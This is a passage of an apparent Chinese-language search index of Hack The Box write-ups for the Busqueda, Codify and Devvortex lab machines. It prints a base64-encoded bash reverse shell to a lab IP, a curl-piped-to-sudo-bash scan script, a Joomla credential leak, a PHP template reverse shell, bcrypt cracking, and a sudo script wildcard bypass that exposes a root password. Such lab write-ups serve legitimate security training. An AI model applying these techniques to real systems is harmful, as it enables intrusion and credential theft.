'\\n' ',' | sed s/,$//)\nnmap -v -n -Pn -sV -O -p ${ports} ${HTB_IP} | tee \"${HTB_IP}_baseScan.nmap\"\necho \"[info] Base scan is Done.\"\n\necho \"[info] Starting NSE vuln scan...\"\nnohup nmap -v -n -Pn -p ${ports} --script=vuln ${HTB_IP} &gt; \"${HTB_IP}_vuln.nmap\" 2&gt;&amp;1 &amp;\necho \"[info] Running NSE vuln scan background...\"\necho \"[info] You could check nmap status with command later: ps -ef | grep 'nmap -v -n -Pn'\"\n\necho \"[info] ===============================================\"\n\necho \"[info] Checking if there is domain for add to hosts...\"\nHEADER_Location=$(curl -I ${HTB_IP} | grep \"Location:\")\n\nif [[ ${HEADER_Location} != '' ]];then\n  HTB_DOMAIN=$(echo ${HEADER_Location} | grep -oP '(?&lt;=Location: http://).*' | tr -d '/\\r')\n  echo \"[info] HTB_DOMAIN: ${HTB_DOMAIN}\"\n\n  if [[ ${HTB_DOMAIN} != '' ]];then\n    # for backup\n    echo \"[info] -------- Back up hosts --------\"\n    cat -e /etc/hosts\n    echo \"[info] -------- Backed up hosts --------\"\n\n    echo \"[info] -------- Add HTB_DOMAIN(${HTB_DOMAIN}) to hosts --------\"\n    echo \"${HTB_IP}    ${HTB_DOMAIN}\" &gt;&gt; /etc/hosts\n    echo \"[info] -------- Modified hosts --------\"\n\n    echo \"[info] -------- Show now hosts --------\"\n    cat -e /etc/hosts\n\n#     echo \"[info] Scanning subdomain...\"\n#     gobuster vhost -u ${HTB_DOMAIN} -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 500 --append-domain -o \"subdomains_${HTB_DOMAIN}.txt\"\n#     echo \"[info] Subdomain scan is Done.\"\n  fi\nfi\n\necho \"[info] ===============================================\"\necho \"[info] The NSE vuln scan maybe still running...\"\necho \"[info] Show ps...\"\nps -ef | grep 'nmap -v -n -Pn'\necho \"[info] ===============================================\"\necho \"[info] Please check nmap status with command: ps -ef | grep 'nmap -v -n -Pn'\"\n</code></pre>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#poc_1","title":"\u9a6c\u540e\u70ae\u5730\u5c1d\u8bd5\u81ea\u5df1\u5206\u6790\u4e00\u4e0bPoC\uff1a","text":"<ol> <li>\u8c37\u6b4c\u641c\u670d\u52a1\u548c\u7248\u672c  </li> <li> <p>\u6b64\u5904\u8bf4eval\u6709\u6f0f\u6d1e\uff0c\u5347\u52302.4.2\u5373\u53ef\u4fee\u590d\uff0c\u4e8e\u662f\u5728gitlab\u641c\u76ee\u6807\u9879\u76ee\u5bf9\u6bd42.4.0\u548c2.4.2\u7684\u5173\u4e8eeval\u7684\u6539\u52a8</p> <pre><code>\u6539\u52a8\u5982\u4e0b\uff1a\n\nurl = eval( f\"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})\" )\n\u2193\nurl = Engine[engine].search(query, copy_url=copy, open_web=open)\n</code></pre> </li> <li> <p>\u770b\u4e0a\u53bb <code>query</code> \u53c2\u6570\u662f\u7528\u5355\u5f15\u53f7\u95ed\u5408\u7684\uff0c\u5e94\u8be5\u53ef\u4ee5\u6ce8\u5165</p> </li> <li>\u5f00burp\u5c1d\u8bd5\u4e00\u4e0b\u5728 <code>query</code> \u53c2\u6570\u6ce8\u5165\u5355\u5f15\u53f7\u3002\u53d1\u73b0\u6709/\u65e0\u5355\u5f15\u53f7\u5176\u7ed3\u679c\u4f1a\u4e0d\u540c\uff0c\u5e94\u8be5\u53ef\u4ee5\u6ce8\u5165</li> <li>\u6784\u9020PoC\uff1a\u2026\u2026</li> <li>\u6784\u9020Exp\uff1a\u53cd\u5f39shell</li> </ol>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Busqueda/#poc_2","title":"\u6784\u9020PoC","text":"<p>\u7b80\u5355\u5730\u641c\u4e00\u4e0b <code>python eval() \u6ce8\u5165</code></p>","tags":["HTB/Easy","HTB/Linux"]},{"location":"writeup/retired/HTB-Codify/","title":"HTB-Codify","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#summary","title":"Summary","text":"<p>\u4ee5\u7b80\u5355\u7684\u77e5\u8bc6\u70b9\u4e5f\u80fd\u6784\u5efa\u51fa\u8fd9\u4e48\u5de7\u5999\u7684\u4e00\u53f0\uff0c\u975e\u5e38\u6709\u8da3\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>SQLite</li> <li>shell script</li> <li>JTR</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-IP&gt;</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.52\n3000/tcp open  http    Node.js Express framework\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5e38\u89c4\u9776\u673a\uff0c22\u7aef\u53e3SSH\u7684\u7248\u672c\u8f83\u65b0\uff0c\u4f18\u5148\u5ea6\u653e\u4f4e\u3002\u5148\u770b80\u7aef\u53e3\u7684Web\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#80","title":"80\u7aef\u53e3","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u70b9\u51fb <code>About Us</code> \u53ef\u5f97\u77e5\u5176\u4f7f\u7528vm2\u3002\u7248\u672c\u4e3a3.9.16\u3002</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u4e00\u4e2a\u6d4b\u8bd5Node.js\u4ee3\u7801\u7684\u7f51\u9875\uff0c\u6709\u4e2aEditor\u754c\u9762\u53ef\u7f16\u5199\u4ee3\u7801\u8fd0\u884c\u6d4b\u8bd5\u3002</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#poc-cve-2023-30547","title":"PoC (CVE-2023-30547)","text":"<p>\u6839\u636evm2\u7684\u7248\u672c\u53f73.9.16\uff0c\u7b80\u5355\u8c37\u6b4c\u4e4b\u540e\u5728github\u53d1\u73b0\u4e00\u4e2a\u6f0f\u6d1e\u63d0\u4ea4\u4e0ePoC\uff1ahttps://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 \u590d\u5236\u5176PoC\u4ee3\u7801\u7c98\u8d34\u5230Editor\u8fd0\u884c\u540e\u65e0\u53cd\u5e94\uff0c\u672c\u8eab\u4e5f\u4e0d\u592a\u61c2Node.js\uff0c\u8ba9ChatGPT\u89e3\u91ca\u4e86\u4e00\u4e0b\u660e\u767d\u4ee3\u7801\u6267\u884c\u5728 <code>execSync()</code> \u5904\u3002\u9042\u5c06\u547d\u4ee4\u6539\u4e3a <code>id</code> \u540e\u518d\u6b21\u8fd0\u884c\uff0c\u6210\u529f\u663e\u793a\u7ed3\u679c\uff1a</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u7b80\u5355\u4e86\uff0c\u4f7f\u7528\u53cd\u5f39shell\u7684\u547d\u4ee4\uff1a<code>echo -n \"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==\" |base64 -d|bash</code></p> <p>\u6210\u529f\u53cd\u8fde\uff1a</p> <pre><code>svc@codify:~$ id\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\nsvc@codify:~$ pwd\n/home/svc\nsvc@codify:~$ ls\npwned  script.sh\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#_2","title":"\u6a2a\u5411\u79fb\u52a8","text":"<p>\u53ef\u4ee5\u53d1\u73b0\u8be5\u7528\u6237\u6ca1\u6709user flag\u3002\u770b\u5bb6\u76ee\u5f55\u6709\u53e6\u4e00\u4e2a\u7528\u6237\uff1ajoshua\uff0c\u4f30\u8ba1\u8981\u6a2a\u5411\u79fb\u52a8\u3002</p> <p>\u4e00\u756a\u63a2\u7d22\u540e\u53d1\u73b0\u4e00\u4e2aDB\u6587\u4ef6\uff1a <pre><code>svc@codify:/var/www/contact$ file tickets.db \ntickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17\nsvc@codify:/var/www/contact$ which sqlite3\n/usr/bin/sqlite3\n\nsqlite&gt; .tables\ntickets  users  \nsqlite&gt; select * from users;\n3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#_3","title":"\u7834\u89e3\u5bc6\u7801","text":"<pre><code>\u2514\u2500$ echo 'joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' &gt; hash.txt\n\n\u2514\u2500$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt \n ... \nspongebob1       (joshua)     \n ...\n</code></pre> <p><code>su</code> \u6216\u8005 <code>ssh</code> \u6210\u529f\u767b\u9646joshua\u7528\u6237\uff1a</p> <pre><code>joshua@codify:~$ id\nuid=1000(joshua) gid=1000(joshua) groups=1000(joshua)\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#flag-user","title":"flag: user","text":"<pre><code>joshua@codify:~$ ls\nuser.txt\njoshua@codify:~$ cat user.txt \n808c ... f408\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#internal-recon","title":"Internal Recon","text":"<p>\u6709\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\u6240\u4ee5\u5148\u770b\u4e86\u773c <code>sudo -l</code>\uff1a</p> <pre><code>joshua@codify:~$ sudo -l\n[sudo] password for joshua: \nMatching Defaults entries for joshua on codify:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser joshua may run the following commands on codify:\n    (root) /opt/scripts/mysql-backup.sh\n</code></pre> <p>\u67e5\u770b\u8fd9\u4e2a\u811a\u672c\uff1a</p> <pre><code>joshua@codify:~$ ls -aihl /opt/scripts/mysql-backup.sh\n401117 -rwxr-xr-x 1 root root 928 Nov  2 12:26 /opt/scripts/mysql-backup.sh\njoshua@codify:~$ cat /opt/scripts/mysql-backup.sh\n#!/bin/bash\nDB_USER=\"root\"\nDB_PASS=$(/usr/bin/cat /root/.creds)\nBACKUP_DIR=\"/var/backups/mysql\"\n\nread -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS\n/usr/bin/echo\n\nif [[ $DB_PASS == $USER_PASS ]]; then\n        /usr/bin/echo \"Password confirmed!\"\nelse\n        /usr/bin/echo \"Password confirmation failed!\"\n        exit 1\nfi\n\n/usr/bin/mkdir -p \"$BACKUP_DIR\"\n\ndatabases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOW DATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")\n\nfor db in $databases; do\n    /usr/bin/echo \"Backing up database: $db\"\n    /usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" | /usr/bin/gzip &gt; \"$BACKUP_DIR/$db.sql.gz\"\ndone\n\n/usr/bin/echo \"All databases backed up successfully!\"\n/usr/bin/echo \"Changing the permissions\"\n/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"\n/usr/bin/chmod 774 -R \"$BACKUP_DIR\"\n/usr/bin/echo 'Done!'\n</code></pre> <p>\u662f\u8fdb\u884c\u6570\u636e\u5e93\u7684\u5907\u4efd\uff0c\u6267\u884c\u65f6\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u5339\u914d <code>$DB_PASS</code>\uff0c\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cif\u6761\u4ef6\u5224\u65ad <code>$DB_PASS == $USER_PASS</code> \u5e76\u672a\u7528\u53cc\u5f15\u53f7\u5305\u56f4\u53d8\u91cf\u3002\u6240\u4ee5\u53ef\u4ee5\u5229\u7528shell\u7684\u901a\u914d\u7b26\u7ed5\u8fc7\u8ba4\u8bc1\u2014\u2014\u5373\u53ef\u4ee5\u5728\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u65f6\u8f93\u5165\u201c*\u201d\u3002</p> <p>\u6267\u884c\uff1a</p> <pre><code>joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh \nEnter MySQL password for root: \nPassword confirmed!\nmysql: [Warning] Using a password on the command line interface can be insecure.\nBacking up database: mysql\nmysqldump: [Warning] Using a password on the command line interface can be insecure.\n-- Warning: column statistics not supported by the server.\nmysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES\nmysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES\nBacking up database: sys\nmysqldump: [Warning] Using a password on the command line interface can be insecure.\n-- Warning: column statistics not supported by the server.\nAll databases backed up successfully!\nChanging the permissions\nDone!\n</code></pre> <p>\u6ce8\u610f\u5230\u7cfb\u7edf\u63d0\u793a\u7684 <code>[Warning] Using a password on the command line interface can be insecure.</code></p> <p>\u90a3\u4e48\u5c31\u7528pspy\u770b\u770b\uff0c\u518d\u6b21\u8fd0\u884c\u811a\u672c\u540e\u53d1\u73b0\u8fd9\u4e00\u6bb5\uff1a</p> <pre><code> ...\n023/11/11 04:51:08 CMD: UID=0     PID=34733  | /usr/bin/echo Backing up database: sys \n2023/11/11 04:51:08 CMD: UID=0     PID=34735  | /bin/bash /opt/scripts/mysql-backup.sh \n2023/11/11 04:51:08 CMD: UID=0     PID=34734  | /usr/bin/mysqldump --force -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 sys\n ...\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#flag-root","title":"flag: root","text":"<pre><code>joshua@codify:~$ su -\nPassword: \nroot@codify:~# ls\nroot.txt  scripts\nroot@codify:~# cat root.txt \nbb7c ... dbb4\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Codify/#_4","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/11/11</p> <p>\u4f3c\u4e4e\u7b2c\u4e00\u6b21\u9047\u5230\u6240\u6709\u77e5\u8bc6\u70b9\u90fd\u649e\u5230\u6211\u4f1a\u7684\u8303\u56f4\u91cc\u7684\u2026\u2026\u7b2c\u4e00\u6b21\u89c9\u5f97\u8fd9\u624d\u662fEasy\u673a\u5668\u554a\uff01</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/","title":"HTB-Devvortex","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>\u5b50\u57df\u679a\u4e3e</li> <li>CVE</li> <li>LINUX Signals</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-IP&gt;</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5e38\u89c4\u7b80\u5355\u9776\u673a\uff0c22\u7aef\u53e3SSH\u4f18\u5148\u5ea6\u653e\u4f4e\u3002\u5148\u770b80\u7aef\u53e3\u7684Web\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#80","title":"80\u7aef\u53e3","text":"<p>\u5e38\u89c4\u626b\u63cf\u65f6\u53d1\u73b0\u5b50\u57df\uff0c\u4f30\u8ba1\u4e3b\u6218\u573a\u5728\u90a3\u8fb9\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#devdevvortexhtb","title":"\u5b50\u57df\uff1adev.devvortex.htb","text":"<ul> <li>robots.txt\uff1a\u53d1\u73b0\u4e00\u4e9b\u6709\u7528\u7684\u76ee\u5f55     <pre><code># If the Joomla site is installed within a folder\n# eg www.example.com/joomla/ then the robots.txt file\n# MUST be moved to the site root\n# eg www.example.com/robots.txt\n# AND the joomla folder name MUST be prefixed to all of the\n# paths.\n# eg the Disallow rule for the /administrator/ folder MUST\n# be changed to read\n# Disallow: /joomla/administrator/\n#\n# For more information about the robots.txt standard, see:\n# https://www.robotstxt.org/orig.html\n\nUser-agent: *\nDisallow: /administrator/\nDisallow: /api/\nDisallow: /bin/\nDisallow: /cache/\nDisallow: /cli/\nDisallow: /components/\nDisallow: /includes/\nDisallow: /installation/\nDisallow: /language/\nDisallow: /layouts/\nDisallow: /libraries/\nDisallow: /logs/\nDisallow: /modules/\nDisallow: /plugins/\nDisallow: /tmp/\n</code></pre></li> <li>.git/config\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u9664\u4e0a\u8ff0\u5916\u65e0\u7279\u522b\u53d1\u73b0</li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#_2","title":"\u5b50\u57df\u5404\u76ee\u5f55","text":"<p>\u9664\u4e86administrator\u5176\u4ed6\u76ee\u5f55\u76f4\u63a5\u8bbf\u95ee\u90fd\u662f\u4e00\u7bc7\u7a7a\u767d\u3002\u800cadministrator\u662f\u4e00\u4e2ajoomla\u7684\u767b\u9646\u754c\u9762\u3002</p> <p></p> <p>\u672c\u6765\u4ee5\u4e3a\u6709\u5f31\u51ed\u636e\uff0c\u641c\u4e86\u4e00\u4e0b\u9ed8\u8ba4\u51ed\u636e\u53ea\u6709\u8bf4\u8d26\u53f7\u4e3aadmin\uff0c\u800c\u5bc6\u7801\u662f\u90e8\u7f72\u65f6\u8bbe\u5b9a\u7684\u3002 \u7b80\u5355\u5c1d\u8bd5SQLi\u8d70\u4e0d\u901a\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#joomla","title":"joomla\u7248\u672c","text":"<p>\u641c\u7d22\u201cjoomla exploit\u201d\uff0c\u6839\u636ehacktricks\u7684\u65b9\u6cd5\u53ef\u4ee5\u53d1\u73b0\u6b64Joomla\u7684\u7248\u672c\u4e3a\u201c4.2.6\u201d\u3002  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#initial-access","title":"Initial Access","text":"<p>\u7ee7\u7eed\u641c\u7d22\u201cjoomla 4.2.6 exploit\u201d\u53ef\u53d1\u73b0\u6b64\u6587\u7ae0\uff1ahttps://vulncheck.com/blog/joomla-for-rce</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#poc-cve-2023-23752","title":"PoC (CVE-2023-23752)","text":"<p>\u6839\u636e\u4e0a\u8ff0\u6587\u7ae0\u8bbf\u95ee <code>/language/en-GB/langmetadata.xml</code> \u83b7\u5f97\u4e00\u4e2a\u51ed\u636e\uff1a<code>lewis:P4ntherg0t1n5r3c0n##</code></p> <p>\u5728administrator\u754c\u9762\u5c1d\u8bd5\u767b\u5f55\u5931\u8d25\uff0c\u4e0d\u8fc7 <code>Lewis:P4ntherg0t1n5r3c0n##</code> \u53ef\u4ee5\u3002 \u4f9d\u65e7\u6839\u636e\u4e0a\u9762\u6587\u7ae0\u7684\u601d\u8def\uff0c\u767b\u5f55\u8fdb\u53bb\u540e\u627etemplates\uff0c\u5c06\u5176\u4fee\u6539\u4e3aPHP\u7684\u53cd\u5f39shell\u3002\u6700\u7ec8\u53d1\u73b0 <code>error.php</code> \u662f\u53ef\u7f16\u8f91\u7684\u3002\u5f00\u542f\u76d1\u542c\uff0c\u66f4\u6539\u4ee3\u7801\u540e\u8bbf\u95ee <code>/templates/cassiopeia/error.php</code>\uff0c\u6210\u529f\u63a5\u6536\u53cd\u5f39shell\u3002</p> <p></p> <pre><code>www-data@devvortex:/$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#flag-user","title":"flag: user","text":"<p>\u5982\u4e0a\u9762\u6587\u7ae0\u6240\u8bf4\uff0c\u4e4b\u524d\u7684\u51ed\u636e\u662f\u672c\u5730MySQL\u7684\u3002\u770b\u4e86\u773c\u7aef\u53e3\u786e\u5b9e\u6709\uff1a <pre><code>www-data@devvortex:/$ netstat -anotl\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       Timer\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)\ntcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)\n ...\n</code></pre></p> <p>\u4e8e\u662f\u8fdbMySQL\u51c6\u5907\u62d6\u5e93\uff1a <pre><code>www-data@devvortex:/$ mysql -u lewis -p joomla\nEnter password: \n (...)\nmysql&gt; show tables;\n+-------------------------------+\n| Tables_in_joomla              |\n+-------------------------------+\n| sd4fg_action_log_config       |\n (...)\n| sd4fg_users                   |\n| sd4fg_viewlevels              |\n| sd4fg_webauthn_credentials    |\n| sd4fg_workflow_associations   |\n| sd4fg_workflow_stages         |\n| sd4fg_workflow_transitions    |\n| sd4fg_workflows               |\n+-------------------------------+\n71 rows in set (0.00 sec)\n\nmysql&gt; select * from sd4fg_users;\n+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+\n| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |\n+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+\n| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-11-28 02:32:37 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |\n| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"timezone\":\"\",\"a11y_mono\":\"0\",\"a11y_contrast\":\"0\",\"a11y_highlight\":\"0\",\"a11y_font\":\"0\"} | NULL          |          0 |        |      |            0 |              |\n+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+\n</code></pre></p> <p>\u5c06sd4fg_users\u8868\u7684\u6570\u636e\u590d\u5236\u4e00\u4e0b\u7136\u540e\u7a0d\u5fae\u6574\u7406\uff0c\u51c6\u5907john\u66b4\u7834\uff1a <pre><code>\u2514\u2500$ fgrep $2y$10$ creds-mysql.txt | awk -F '|' '{print $4 $6}' | awk '{print $1,$2}' | tr ' ' ':' &gt; creds-mysql-trim.txt\n\n\u2514\u2500$ cat creds-mysql-trim.txt           \nlewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u\nlogan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12\n\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt creds-mysql-trim.txt   \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ntequieromucho    (logan)\n (...)\n</code></pre></p> <p>\u7a81\u7136\u60f3\u8d77\u6765lewis\u5c31\u662f\u6211\u4eec\u8fdbMySQL\u7684\u7528\u6237\u3002logan\u7528\u6237\u4e5f\u66b4\u7834\u51fa\u6765\u4e86\uff0c\u90a3\u4e48\u5c31\u5207\u6362\u7528\u6237\u3002\u4e4b\u524d\u770bhome\u76ee\u5f55\u4e5f\u6709logan\uff0c\u4f30\u8ba1user flag\u5c31\u5728\u8fd9\u4e86\uff1a <pre><code>www-data@devvortex:/$ su logan\nPassword: \nlogan@devvortex:/$ id\nuid=1000(logan) gid=1000(logan) groups=1000(logan)\nlogan@devvortex:/$ cd\nlogan@devvortex:~$ ls\nuser.txt\nlogan@devvortex:~$ cat user.txt \nd0a5 (...) acf4\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u6709\u5bc6\u7801\u5148\u76f4\u63a5\u770b\u770b <code>sudo -l</code>\uff0c\u6709\u4e00\u6761\u547d\u4ee4\uff0c\u5f88\u6709\u53ef\u80fd\u8fd9\u5c31\u662f\u7a81\u7834\u53e3\uff1a <pre><code>logan@devvortex:~$ sudo -l\n[sudo] password for logan: \nMatching Defaults entries for logan on devvortex:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser logan may run the following commands on devvortex:\n    (ALL : ALL) /usr/bin/apport-cli\n</code></pre></p> <p>\u53ef\u4ee5\u67e5\u770b\u7248\u672c\uff1a <pre><code>logan@devvortex:~$ /usr/bin/apport-cli -v\n2.20.11\n</code></pre></p> <p>\u5b9e\u8df5\u53d1\u73b0\u8c37\u6b4c\u6bd4 <code>searchsploit</code> \u597d\u7528\u591a\u4e86\u554a\u2026\u2026\u201capport-cli 2.20.11 exploit\u201d\u641c\u4e00\u6ce2\u53d1\u73b0\u4e0b\u9762\u6587\u7ae0\uff1a</p> <p>https://nvd.nist.gov/vuln/detail/CVE-2023-1326 https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#poc-cve-2023-1326","title":"PoC (CVE-2023-1326)","text":"<p>github\u63d0\u4ea4\u4e2d\u5199\u4e86PoC\uff0c\u5e2e\u5927\u5fd9\u4e86\u3002\u90a3\u4e48\u95ee\u9898\u5c31\u662f\u5982\u4f55\u751f\u6210crash\u6587\u4ef6\u5462\uff1f</p> 